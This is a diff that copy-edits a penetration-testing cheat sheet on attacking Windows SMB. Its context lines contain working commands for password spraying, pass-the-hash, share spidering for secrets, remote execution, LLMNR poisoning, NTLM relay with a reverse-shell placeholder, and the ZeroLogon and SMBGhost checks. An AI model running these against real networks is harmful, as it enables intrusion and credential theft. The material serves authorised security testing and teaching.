@@ -17,7 +17,7 @@ enum4linux-ng -A -C 10.10.10.10
 
 ## Authentication
 
-Verify user privileges and acess on systems
+Verify user privileges and access on systems.
 
 ```sh
 nxc smb 10.10.10.100 -u localuser -p 'Password' --local-auth    # single auth
@@ -25,7 +25,7 @@ nxc smb 10.10.10.0/24 -u localuser -p 'Password' --local-auth   # subnet spray
 nxc smb 10.10.10.100 -u Administrator -H 'hash' --local-auth    # pass the hash
 ```
 
-By default, nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list.
+By default, `nxc` exits after a successful login is found. The `--continue-on-success` flag continues spraying after a valid password is found, which is useful when validating a single approved password against a large user list.
 
 ---
 
@@ -35,7 +35,7 @@ By default, nxc will exit after a successful login is found. Using the `--contin
 #  Lists users currently logged into the machine and which DC they connected to
 nxc smb 10.10.10.10 -u <user> -p <password> --loggedon-users  # Use CIDR notation to scan subnets (10.10.10.0/24)
 
-# RID brute — works on many DCs even with null/guest
+# RID brute - works on many DCs even with null/guest
 nxc smb 10.10.10.10 -u '' -p '' --rid-brute
 nxc smb 10.10.10.10 -u <user> -p <password> --rid-brute
 
@@ -51,7 +51,7 @@ impacket-lookupsid 'EXAMPLE/<user>:<password>'@10.10.10.10
 
 ## Password Policy
 
-Pull this *before* spraying — locking out ten domain users on the first day is a bad look.
+Pull this *before* spraying, locking out ten domain users on the first day is a bad look.
 
 ```bash
 nxc smb 10.10.10.10 -u <user> -p <password> --pass-pol
@@ -114,11 +114,11 @@ smbmap -H 10.10.10.10 -u <user> -p '<lm>:<ntlm>'
 Once you can read shares, recursively grep for credentials, configs, and key material.
 
 ```bash
-# nxc spider — fast, regex-based, runs across multiple hosts
+# nxc spider - fast, regex-based, runs across multiple hosts
 nxc smb 10.10.10.10 -u <user> -p <password> -M spider_plus
 nxc smb 10.10.10.10 -u <user> -p <password> --spider <share> --regex 'password|secret|cred'
 
-# manspider — heavier, greps file *contents* including office docs and PDFs
+# manspider - heavier, greps file *contents* including office docs and PDFs
 manspider 10.10.10.10 -u <user> -p <password> -c 'password' 'apikey' 'BEGIN PRIVATE KEY'
 ```
 
@@ -159,16 +159,16 @@ export KRB5CCNAME=<user>.ccache
 psexec.py -k -no-pass EXAMPLE/<user>@dc01.example.local
 ```
 
-Target by FQDN (not IP) when using Kerberos — SPNs are tied to hostnames.
+Target by FQDN (not IP) when using Kerberos. SPNs are tied to hostnames.
 
 ---
 
 ## Remote Command Execution
 
-For one-off commands, `nxc -x` is the daily driver — it wraps the same execution methods as the impacket tools below, but runs across many hosts at once and handles cred spraying:
+For one-off commands, `nxc -x` is the daily driver, it wraps the same execution methods as the impacket tools below, but runs across many hosts at once and handles cred spraying:
 
 ```bash
-# CMD execution (default method is wmiexec — no service, no binary on disk)
+# CMD execution (default method is wmiexec - no service, no binary on disk)
 nxc smb 10.10.10.10 -u <user> -p <password> -x 'whoami'
 
 # PowerShell execution
@@ -179,19 +179,19 @@ nxc smb 10.10.10.10 -u <user> -p <password> --exec-method smbexec -x 'whoami'
 nxc smb 10.10.10.10 -u <user> -p <password> --exec-method atexec -x 'whoami'
 ```
 
-Reach for the impacket tools when you need an **interactive shell** — `nxc -x` runs each command in a fresh session, so you can't `cd` and have state persist. Same underlying mechanisms, different UX:
+Reach for the impacket tools when you need an **interactive shell**, `nxc -x` runs each command in a fresh session, so you can't `cd` and have state persist. Same underlying mechanisms, different UX:
 
 ```bash
-# Full SYSTEM shell — drops binary + creates service (noisy, but reliable)
+# Full SYSTEM shell - drops binary + creates service (noisy, but reliable)
 impacket-psexec user:'password'@10.10.10.10
 
-# DCOM/WMI semi-interactive — quieter than psexec
+# DCOM/WMI semi-interactive - quieter than psexec
 impacket-wmiexec user:'password'@10.10.10.10
 
-# Semi-interactive via SMB named pipes — no binary on disk
+# Semi-interactive via SMB named pipes - no binary on disk
 impacket-smbexec user:'password'@10.10.10.10
 
-# One-shot via scheduled task — useful when 445 is filtered but RPC/135 is open
+# One-shot via scheduled task - useful when 445 is filtered but RPC/135 is open
 impacket-atexec user:'password'@10.10.10.10 'whoami'
 ```
 
@@ -222,7 +222,7 @@ When a Windows host can't resolve a name via DNS, it falls back to multicast: **
 
 ### Capture
 
-Run in *analyze mode* first — passively observes poisonable traffic without spoofing, useful for confirming the attack is viable before being noisy:
+Run in *analyze mode* first, passively observes poisonable traffic without spoofing, useful for confirming the attack is viable before being noisy:
 
 ```bash
 sudo responder -I eth0 -A
@@ -240,7 +240,7 @@ Captured hashes land in `/usr/share/responder/logs/` (one file per protocol/host
 demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A...:01010000...
 ```
 
-Crack with hashcat — mode `5600` for NetNTLMv2, `5500` for NetNTLMv1:
+Crack with hashcat, mode `5600` for NetNTLMv2, `5500` for NetNTLMv1:
 
 ```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
@@ -271,7 +271,7 @@ Then run responder and ntlmrelayx side by side:
 # Default behavior: dump SAM as the relayed user (needs local admin on target)
 impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10
 
-# Execute a command — paste a base64-encoded PowerShell rev shell from revshells.com
+# Execute a command - paste a base64-encoded PowerShell rev shell from revshells.com
 impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c 'powershell -e <base64>'
 
 # Multi-target list
@@ -306,7 +306,7 @@ exploit
 
 ### SMBGhost (CVE-2020-0796)
 
-SMBv3.1.1 compression bug — affects unpatched Windows 10 1903/1909 and Server 2004/1909. [POCs](https://www.exploit-db.com/exploits/48537) are kernel exploits and frequently crash the target; LPE PoCs are far more reliable.
+SMBv3.1.1 compression bug, affects unpatched Windows 10 1903/1909 and Server 2004/1909. [POCs](https://www.exploit-db.com/exploits/48537) are kernel exploits and frequently crash the target; LPE PoCs are far more reliable.
 
 ```bash
 nmap -p 445 --script smb-protocols 10.10.10.10   # confirm SMB 3.1.1 with compression
@@ -315,7 +315,7 @@ nxc smb 10.10.10.10 -M smbghost
 
 ### ZeroLogon (CVE-2020-1472)
 
-Netlogon protocol — not strictly SMB, but it lives in the same DC-attack workflow.
+Netlogon protocol, not strictly SMB, but it lives in the same DC-attack workflow.
 
 ```bash
 nxc smb 10.10.10.10 -M zerologon
@@ -324,7 +324,7 @@ nxc smb 10.10.10.10 -M zerologon
 If vulnerable: back up the DC machine account hash with `secretsdump.py`, run a PoC that resets the machine password to empty, dump domain creds, then *restore* the original password to avoid breaking the DC.
 
 !!! tip "Real-world"
-    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `nxc smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
+    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR, many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `nxc smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
 
 ---
 
